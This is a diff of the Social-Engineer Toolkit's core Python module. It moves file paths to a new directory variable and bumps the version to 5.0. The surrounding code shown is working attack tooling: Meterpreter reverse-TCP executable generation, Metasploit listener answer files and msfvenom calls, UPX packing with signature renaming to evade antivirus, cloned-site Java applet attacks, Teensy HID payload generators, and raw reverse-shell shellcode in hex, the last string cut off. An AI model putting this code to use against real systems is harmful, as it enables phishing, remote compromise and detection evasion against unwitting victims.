@@ -27,8 +27,16 @@ except ImportError:
     print "[!] The python-pycrypto python module not installed. You will loose the ability for encrypted communications."
     pass
 
-# used to grab the true path for current working directory
-definepath = os.getcwd()
+# get the main SET path
+def definepath():
+    if check_os() == "posix":
+        if os.path.isfile("/usr/share/setoolkit/se-toolkit"):
+            return "/usr/share/setoolkit/"
+
+        else: return os.getcwd()
+
+    else:
+        return os.getcwd()            
 
 # check operating system
 def check_os():
@@ -195,9 +203,6 @@ def debug_msg(currentModule, message, msgType):
             # a bit more streamlined
             print bcolors.RED + "\nDEBUG_MSG: from module '" + currentModule + "': " + message + bcolors.ENDC
 
-            #print "\n" + bcolors.RED + debugFrameString + "\nDEBUG_MSG: from module '" + currentModule + "': " + message + "\n" + debugFrameString + bcolors.ENDC
-            #print "Debug level: %s" % DEBUG_LEVEL
-            #print ("    msgType: %s" % msgType) + "\n"
             if DEBUG_LEVEL == 2 or DEBUG_LEVEL == 4 or DEBUG_LEVEL == 6:
                 raw_input("waiting for <ENTER>\n")
 
@@ -224,7 +229,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '4.7.2'
+    define_version = '5.0'
     return define_version
 
 class create_menu:
@@ -268,7 +273,7 @@ def validate_ip(address):
 #
 def meta_path():
     # DEFINE METASPLOIT PATH
-    meta_path = file("%s/config/set_config" % (definepath),"r").readlines()
+    meta_path = file("%s/config/set_config" % (definepath()),"r").readlines()
     for line in meta_path:
         line = line.rstrip()
         match = re.search("METASPLOIT_PATH=", line)
@@ -297,6 +302,9 @@ def meta_path():
                 if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
                     msf_path = "/opt/metasploit/msf3/"
                     trigger = 1
+                if os.path.isfile("/usr/bin/msfconsole"):
+                    msf_path = ""
+                    trigger = 1
                 if trigger == 0:
                     if check_os() != "windows":
                         check_metasploit = check_config("METASPLOIT_MODE=").lower()
@@ -318,7 +326,7 @@ def meta_path():
 #
 def meta_database():
     # DEFINE METASPLOIT PATH
-    meta_path = file("%s/config/set_config" % (definepath),"r").readlines()
+    meta_path = file("%s/config/set_config" % (definepath()),"r").readlines()
     for line in meta_path:
         line = line.rstrip()
         match = re.search("METASPLOIT_DATABASE=", line)
@@ -333,7 +341,7 @@ def meta_database():
 #
 def grab_ipaddress():
     try:
-        fileopen = file("%s/config/set_config" % (definepath), "r").readlines()
+        fileopen = file("%s/config/set_config" % (definepath()), "r").readlines()
         for line in fileopen:
             line = line.rstrip()
             match = re.search("AUTO_DETECT=ON", line)
@@ -370,65 +378,6 @@ def grab_ipaddress():
         print_error("ERROR:Something went wrong:")
         print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC
 
-#
-# check for pexpect
-#
-def check_pexpect():
-    try:
-        import pexpect
-
-    except:
-        try:
-            import src.core.thirdparty.pexpect
-        except:
-            print_error("ERROR:PExpect is required in order to fully run SET")
-            print_warning("Please download and install PExpect: http://sourceforge.net/projects/pexpect/files/pexpect/Release%202.3/pexpect-2.3.tar.gz/download")
-            if check_os() == "posix":
-                #answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))
-                answer = yesno_prompt("0", "Would you like SET to attempt to install it for you? [yes|no]")
-                if answer == "YES":
-                    print_info("Installing Pexpect")
-                    subprocess.Popen("wget http://downloads.sourceforge.net/project/pexpect/pexpect/Release%202.3/pexpect-2.3.tar.gz?use_mirror=hivelocity;tar -zxvf pexpect-2.3.tar.gz;cd pexpect-2.3/;python setup.py install", shell=True).wait()
-                    # clean up
-                    subprocess.Popen("rm -rf pexpect-2.3*", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                    print_status("Finished... Relaunch SET, if it doesn't work for you, install manually.")
-                    sys.exit(1)
-                if answer == "NO":
-                    sys.exit(1)
-                else:
-                    print_error("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
-                    sys.exit(1)
-
-#
-# check for beautifulsoup
-#
-# try import for BeautifulSoup, required for MLITM
-def check_beautifulsoup():
-    try:
-        import BeautifulSoup
-    except:
-        try:
-            import src.core.thirdparty.BeautifulSoup
-
-        except:
-            print_error("ERROR:BeautifulSoup is required in order to fully run SET")
-            print_warning("Please download and install BeautifulSoup: http://www.crummy.com/software/BeautifulSoup/download/3.x/BeautifulSoup-3.2.0.tar.gz")
-            if check_os() == "posix":
-                #answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))
-                answer = yesno_prompt("0", "Would you like SET to attempt to install it for you? [yes|no]")
-                if answer == "YES":
-                    print_info("Installing BeautifulSoup...")
-                    subprocess.Popen("wget http://www.crummy.com/software/BeautifulSoup/download/3.x/BeautifulSoup-3.2.0.tar.gz;tar -zxvf BeautifulSoup-3.2.0.tar.gz;cd BeautifulSoup-*;python setup.py install", shell=True).wait()
-                    # clean up
-                    subprocess.Popen("rm -rf BeautifulSoup-*", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                    print_status("Finished... Relaunch SET, if it doesn't work for you, install manually.")
-                    sys.exit(1)
-
-                if answer == "NO":
-                    sys.exit()
-                else:
-                    print_error("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
-                    sys.exit(1)
 
 # mssql check
 def check_mssql():
@@ -474,11 +423,11 @@ def check_mssql():
 def cleanup_routine():
     try:
         # restore original Java Applet
-        shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath), "%s/src/program_junk/Signed_Update.jar" % (definepath))
+        shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath()), setdir + "/Signed_Update.jar")
         if os.path.isfile("newcert.pem"):
             os.remove("newcert.pem")
-        if os.path.isfile("src/program_junk/interfaces"):
-            os.remove("src/program_junk/interfaces")
+        if os.path.isfile(setdir + "/interfaces"):
+            os.remove(setdir + "/interfaces")
         if os.path.isfile("src/html/1msf.raw"):
             os.remove("src/html/1msf.raw")
         if os.path.isfile("src/html/2msf.raw"):
@@ -487,9 +436,9 @@ def cleanup_routine():
             os.remove("msf.exe")
         if os.path.isfile("src/html/index.html"):
             os.remove("src/html/index.html")
-        if os.path.isfile("src/program_junk/Signed_Update.jar"):
-            os.remove("src/program_junk/Signed_Update.jar")
-        #subprocess.Popen("rm -rf src/program_junk/*", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+        if os.path.isfile(setdir + "/Signed_Update.jar"):
+            os.remove(setdir + "/Signed_Update.jar")
+
     except:
         pass
 
@@ -508,6 +457,9 @@ def update_metasploit():
 #
 def update_set():
     print_info("Updating the Social-Engineer Toolkit, be patient...")
+    print_info("Performing cleanup first...")
+    subprocess.Popen("git clean -fd", shell=True).wait()
+    print_info("[*] Updating... This could take a little bit...")
     subprocess.Popen("git pull", shell=True).wait()
     print_status("The updating has finished, returning to main menu..")
     time.sleep(2)
@@ -550,19 +502,19 @@ def generate_random_string(low, high):
 def site_cloner(website, exportpath, *args):
     grab_ipaddress()
     ipaddr = grab_ipaddress()
-    filewrite = file("src/program_junk/interface", "w")
+    filewrite = file(setdir + "/interface", "w")
     filewrite.write(ipaddr)
     filewrite.close()
-    filewrite = file("src/program_junk/ipaddr", "w")
+    filewrite = file(setdir + "/ipaddr", "w")
     filewrite.write(ipaddr)
     filewrite.close()
-    filewrite = file("src/program_junk/site.template", "w")
+    filewrite = file(setdir + "/site.template", "w")
     filewrite.write("URL=" + website)
     filewrite.close()
     # if we specify a second argument this means we want to use java applet
     if args[0] == "java":
         # needed to define attack vector
-        filewrite = file("src/program_junk/attack_vector", "w")
+        filewrite = file(setdir + "/attack_vector", "w")
         filewrite.write("java")
         filewrite.close()
     sys.path.append("src/webattack/web_clone")
@@ -577,7 +529,7 @@ def site_cloner(website, exportpath, *args):
 
     # copy the file to a new folder
     print_status("Site has been successfully cloned and is: " + exportpath)
-    subprocess.Popen("mkdir '%s';cp src/program_junk/web_clone/* '%s'" % (exportpath, exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, setdir, exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 #
 # this will generate a meterpreter reverse payload (executable)
@@ -590,17 +542,17 @@ def site_cloner(website, exportpath, *args):
 def meterpreter_reverse_tcp_exe(port):
 
     ipaddr = grab_ipaddress()
-    filewrite = file("src/program_junk/interface", "w")
+    filewrite = file(setdir + "/interface", "w")
     filewrite.write(ipaddr)
     filewrite.close()
-    filewrite = file("src/program_junk/ipaddr", "w")
+    filewrite = file(setdir + "/ipaddr", "w")
     filewrite.write(ipaddr)
     filewrite.close()
     update_options("IPADDR=" + ipaddr)
 
     # trigger a flag to be checked in payloadgen
     # if this flag is true, it will skip the questions
-    filewrite = file("src/program_junk/meterpreter_reverse_tcp_exe", "w")
+    filewrite = file(setdir + "/meterpreter_reverse_tcp_exe", "w")
     filewrite.write(port)
     filewrite.close()
     # import the system path for payloadgen in SET
@@ -615,20 +567,20 @@ def meterpreter_reverse_tcp_exe(port):
 
     random_value = generate_random_string(5, 10)
     # copy the created executable to program_junk
-    print_status("Executable created under src/program_junk/%s.exe" % (random_value))
-    subprocess.Popen("cp src/program_junk/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    print_status("Executable created under %s/%s.exe" % (setdir,random_value))
+    subprocess.Popen("cp %s/msf.exe %s/%s.exe" % (setdir,setdir,random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 #
 # Start a metasploit multi handler
 #
 def metasploit_listener_start(payload,port):
     # open a file for writing
-    filewrite = file("%s/src/program_junk/msf_answerfile" % (definepath), "w")
+    filewrite = file(setdir + "/msf_answerfile", "w")
     filewrite.write("use multi/handler\nset payload %s\nset LHOST 0.0.0.0\nset LPORT %s\nexploit -j\n\n" % (payload, port))
     # close the file
     filewrite.close()
     # launch msfconsole
     metasploit_path = meta_path()
-    subprocess.Popen("%s/msfconsole -r %s/src/program_junk/msf_answerfile" % (metasploit_path, definepath), shell=True).wait()
+    subprocess.Popen("%s/msfconsole -r %s/msf_answerfile" % (metasploit_path, setdir), shell=True).wait()
 
 #
 # This will start a web server in the directory root you specify, so for example
@@ -646,11 +598,8 @@ def start_web_server(directory):
         # thread this mofo
         os.chdir(directory)
         thread.start_new_thread(httpd.serve_forever, ())
-        #httpd.serve_forever()
-        # change directory to the path we specify for output path
-        # os.chdir(directory)
-    # handle keyboard interrupts
 
+    # handle keyboard interrupts
     except KeyboardInterrupt:
         print_info("Exiting the SET web server...")
         httpd.socket.close()
@@ -693,13 +642,12 @@ def java_applet_attack(website, port, directory):
     # this part is needed to rename the msf.exe file to a randomly generated one
     filename = check_options("MSF.EXE=")
     if check_options != 0:
-    #if os.path.isfile("src/program_junk/rand_gen"):
 
         # move the file to the specified directory and filename
-        subprocess.Popen("cp src/program_junk/msf.exe %s/%s" % (directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        subprocess.Popen("cp %s/msf.exe %s/%s" % (setdir,directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     # lastly we need to copy over the signed applet
-    subprocess.Popen("cp src/program_junk/Signed_Update.jar %s" % (directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    subprocess.Popen("cp %s/Signed_Update.jar %s" % (setdir,directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     # start the web server by running it in the background
     start_web_server(directory)
@@ -721,36 +669,36 @@ def teensy_pde_generator(attack_method):
     if attack_method == "beef":
         # specify the filename
         filename = file("src/teensy/beef.pde", "r")
-        filewrite = file("reports/beef.pde", "w")
-        teensy_string = ("Successfully generated Teensy HID Beef Attack Vector under reports/beef.pde")
+        filewrite = file(setdir + "/reports/beef.pde", "w")
+        teensy_string = ("Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.pde" % (setdir))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "powershell_down":
         # specify the filename
         filename = file("src/teensy/powershell_down.pde", "r")
-        filewrite = file("reports/powershell_down.pde", "w")
-        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/powershell_down.pde")
+        filewrite = file(setdir + "/reports/powershell_down.pde", "w")
+        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.pde" % (setdir))
 
     # if we are doing the attack vector teensy
     if attack_method == "powershell_reverse":
         # specify the filename
         filename = file("src/teensy/powershell_reverse.pde", "r")
-        filewrite = file("reports/powershell_reverse.pde", "w")
-        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/powershell_reverse.pde")
+        filewrite = file(setdir + "/reports/powershell_reverse.pde", "w")
+        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.pde" % (setdir))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "java_applet":
         # specify the filename
         filename = file("src/teensy/java_applet.pde", "r")
-        filewrite = file("reports/java_applet.pde", "w")
-        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/java_applet.pde")
+        filewrite = file(setdir + "/reports/java_applet.pde", "w")
+        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.pde" % (setdir))
 
     # if we are doing the attack vector teensy
     if attack_method == "wscript":
         # specify the filename
         filename = file("src/teensy/wscript.pde", "r")
-        filewrite = file("reports/wscript.pde", "w")
-        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/wscript.pde")
+        filewrite = file(setdir + "/reports/wscript.pde", "w")
+        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/wscript.pde" % (setdir))
 
     # All the options share this code except binary2teensy
     if attack_method != "binary2teensy":
@@ -765,7 +713,7 @@ def teensy_pde_generator(attack_method):
     if attack_method == "binary2teensy":
         # specify the filename
         import src.teensy.binary2teensy
-        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/binary2teensy.pde")
+        teensy_string = ("Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.pde" % (setdir)) 
 
     print_status(teensy_string)
 #
@@ -780,14 +728,14 @@ def windows_root():
 #
 def log(error):
         # open log file only if directory is present (may be out of directory for some reason)
-    if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)):
-        filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "w")
+    if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
+        filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "w")
         filewrite.write("")
         filewrite.close()
-    if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)):
+    if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
         error = str(error)
         # open file for writing
-        filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "a")
+        filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "a")
         # write error message out
         filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
         # close the file
@@ -813,16 +761,16 @@ def upx(path_to_file):
     if os.path.isfile(upx_path):
         print_info("Packing the executable and obfuscating PE file randomly, one moment.")
         # packing executable
-        subprocess.Popen("%s -9 -q -o src/program_junk/temp.binary %s" % (upx_path, path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        subprocess.Popen("%s -9 -q -o %s/temp.binary %s" % (upx_path, setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
         # move it over the old file
-        subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        subprocess.Popen("mv %s/temp.binary %s" % (setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
         # random string
         random_string = generate_random_string(3,3).upper()
 
         # 4 upx replace - we replace 4 upx open the file
         fileopen = file(path_to_file, "rb")
-        filewrite = file("src/program_junk/temp.binary", "wb")
+        filewrite = file(setdir + "/temp.binary", "wb")
 
         # read the file open for data
         data = fileopen.read()
@@ -830,7 +778,7 @@ def upx(path_to_file):
         filewrite.write(data.replace("UPX", random_string, 4))
         filewrite.close()
         # copy the file over
-        subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        subprocess.Popen("mv %s/temp.binary %s" % (setdir,path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     time.sleep(3)
 
 def show_banner(define_version,graphic):
@@ -847,16 +795,16 @@ def show_banner(define_version,graphic):
     print bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
-[---]                  Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                  [---]
-[---]               Codename: '""" + bcolors.YELLOW + """Headshot""" + bcolors.BLUE + """'               [---]
-[---]         Follow us on Twitter: """ + bcolors.PURPLE+ """@trustedsec""" + bcolors.BLUE+"""        [---]
-[---]         Follow me on Twitter: """ + bcolors.PURPLE+ """@dave_rel1k""" + bcolors.BLUE+"""        [---]
+[---]                  Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
+[---]            Codename: '""" + bcolors.YELLOW + """The Wild West""" + bcolors.BLUE + """'             [---]
+[---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@trustedsec""" + bcolors.BLUE+"""         [---]
+[---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@dave_rel1k""" + bcolors.BLUE+"""         [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
 
 """ + bcolors.GREEN+"""     Welcome to the Social-Engineer Toolkit (SET). The one
   stop shop for all of your social-engineering needs.
 """
-    print bcolors.BLUE + """      Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
+    print bcolors.BLUE + """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
     print bcolors.BOLD + """  The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC
 
 def show_graphic():
@@ -1087,18 +1035,18 @@ def is_valid_ipv6(ip):
         (?!.*::.*::)                # Only a single whildcard allowed
         (?:(?!:)|:(?=:))            # Colon iff it would be part of a wildcard
         (?:                         # Repeat 6 times:
-            [0-9a-f]{0,4}           #   A group of at most four hexadecimal digits
-            (?:(?<=::)|(?<!::):)    #   Colon unless preceeded by wildcard
+            [0-9a-f]{0,4}           # A group of at most four hexadecimal digits
+            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
         ){6}                        #
         (?:                         # Either
-            [0-9a-f]{0,4}           #   Another group
-            (?:(?<=::)|(?<!::):)    #   Colon unless preceeded by wildcard
-            [0-9a-f]{0,4}           #   Last group
-            (?: (?<=::)             #   Colon iff preceeded by exacly one colon
+            [0-9a-f]{0,4}           # Another group
+            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
+            [0-9a-f]{0,4}           # Last group
+            (?: (?<=::)             # Colon iff preceeded by exacly one colon
              |  (?<!:)              #
              |  (?<=:) (?<!::) :    #
              )                      # OR
-         |                          #   A v4 address with NO leading zeros
+         |                          # A v4 address with NO leading zeros
             (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
             (?: \.
                 (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
@@ -1123,7 +1071,7 @@ def kill_proc(port,flag):
 
 # check the config file and return value
 def check_config(param):
-    fileopen = file("%s/config/set_config" % (definepath), "r")
+    fileopen = file("%s/config/set_config" % (definepath()), "r")
     for line in fileopen:
         # if the line starts with the param we want then we are set, otherwise if it starts with a # then ignore
         if line.startswith(param) != "#":
@@ -1148,7 +1096,6 @@ def copyfolder(sourcePath, destPath):
         #then create a new folder
         if not os.path.isdir(dest):
             os.mkdir(dest)
-            #print('Directory created at: ' + dest)
 
         #loop through all files in the directory
         for f in files:
@@ -1168,7 +1115,7 @@ def copyfolder(sourcePath, destPath):
 def check_options(option):
         # open the directory
     trigger = 0
-    fileopen = file("%s/src/program_junk/set.options" % (definepath), "r").readlines()
+    fileopen = file(setdir + "/set.options", "r").readlines()
     for line in fileopen:
         match = re.search(option, line)
         if match:
@@ -1182,13 +1129,13 @@ def check_options(option):
 # future home to update one localized set configuration file
 def update_options(option):
         # if the file isn't there write a blank file
-    if not os.path.isfile("%s/src/program_junk/set.options" % (definepath)):
-        filewrite = file("%s/src/program_junk/set.options" % (definepath), "w")
+    if not os.path.isfile(setdir + "/set.options"):
+        filewrite = file(setdir + "/set.options", "w")
         filewrite.write("")
         filewrite.close()
 
     # remove old options
-    fileopen = file("%s/src/program_junk/set.options" % (definepath), "r")
+    fileopen = file(setdir + "/set.options", "r")
     old_options = ""
     for line in fileopen:
         match = re.search(option, line)
@@ -1196,7 +1143,7 @@ def update_options(option):
             line = ""
         old_options = old_options + line
     # append to file
-    filewrite = file("%s/src/program_junk/set.options" % (definepath), "w")
+    filewrite = file(setdir + "/set.options", "w")
     filewrite.write(old_options + "\n" + option + "\n")
     filewrite.close()
 
@@ -1228,7 +1175,7 @@ def socket_listener(port):
 # generates powershell payload
 def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
-        # generate our shellcode first
+    # generate our shellcode first
     shellcode = metasploit_shellcode(payload, ipaddr, port)
     shellcode = shellcode_replace(ipaddr, port, shellcode)
     shellcode = shellcode.rstrip()
@@ -1261,7 +1208,7 @@ def generate_shellcode(payload,ipaddr,port):
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
     data = data.replace(";", "")
@@ -1276,10 +1223,12 @@ def generate_shellcode(payload,ipaddr,port):
 
 # this will take input for shellcode and do a replace for IP addresses
 def shellcode_replace(ipaddr, port, shellcode):
+
     # split up the ip address
     ip = ipaddr.split('.')
     # join the ipaddress into hex value spaces still in tact
     ipaddr = ' '.join((hex(int(i))[2:] for i in ip))
+
     # We use a default 255.254.253.252 on all shellcode then replace
     # 255.254.253.252 --> hex --> ff fe fd fc
     # 443 = '0x1bb'
@@ -1303,7 +1252,7 @@ def shellcode_replace(ipaddr, port, shellcode):
             counter = counter + 1
         # redefine the port in hex here
         port = new_port
-    #ipaddr = "\\x" + ipaddr
+
     ipaddr = ipaddr.split(" ")
     first = ipaddr[0]
     # split these up to make sure its in the right format
@@ -1318,9 +1267,11 @@ def shellcode_replace(ipaddr, port, shellcode):
     fourth = ipaddr[3]
     if len(fourth) == 1:
         fourth = "0" + fourth
+
     # put the ipaddress into the right format
     ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first,second,third,fourth)
     shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)
+
     if port != "443":
         # getting everything into the right format
         if len(port) > 4:
@@ -1329,6 +1280,7 @@ def shellcode_replace(ipaddr, port, shellcode):
         if len(port) == 4:
             port = "\\x00\\x00" + port
         shellcode = shellcode.replace(r"\x00\x01\xbb", port)
+
     # return shellcode
     return shellcode
 
@@ -1344,6 +1296,7 @@ def metasploit_shellcode(payload, ipaddr, port):
 
     # if we are using reverse meterpreter tcp
     if payload == "windows/meterpreter/reverse_tcp":
+        #shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
         shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
 
     # reverse https requires generation through msfvenom
@@ -1368,7 +1321,9 @@ def metasploit_shellcode(payload, ipaddr, port):
 
     # reverse meterpreter tcp
     if payload == "windows/x64/meterpreter/reverse_tcp":
-        shellcode = r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x00\x16\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xb